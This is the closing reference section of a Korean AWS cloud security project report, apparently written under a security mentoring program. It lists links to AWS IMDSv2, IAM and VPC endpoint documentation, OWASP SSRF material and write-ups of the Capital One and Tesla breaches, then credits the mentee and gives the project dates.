- [IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [VPC Endpoints](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html)

### OWASP
- [SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [Top 10 2021](https://owasp.org/Top10/)

### 실제 사례
- [Capital One Breach (KrebsOnSecurity)](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
- [Tesla Cryptojacking (RedLock)](https://redlock.io/blog/cryptojacking-tesla)

---

**작성 완료**: 2025-11-17
**프로젝트 기간**: 2025년 11월
**멘티**: 황준하
**희망분야**: AWS 클라우드 보안
**멘토링**: 보안 전문가 현직자 멘토링 프로그램
